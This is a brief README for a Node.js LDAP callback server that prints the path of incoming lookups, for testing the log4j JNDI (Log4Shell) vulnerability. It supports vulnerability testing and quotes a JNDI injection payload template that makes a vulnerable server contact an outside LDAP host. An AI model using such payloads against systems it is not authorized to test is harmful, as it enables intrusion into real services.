# Introduction

This is a server that will print out all `baseObject` from ldap connections. Basically if you execute log4j payload f.e. `${jndi:ldap://ip:port/PATH}`, the server will print out the "PATH" part which is really convenient for testing the vulnerability.


## How to use?

1. `git clone git@github.com:kannthu/ldap-log4j.git`

Note. DO NOT RUN `npm install`, we modified library `ldapjs` to print out the data, so if you run install it will be overriden. Do not do this.

2. `node script.js` - just run the server:)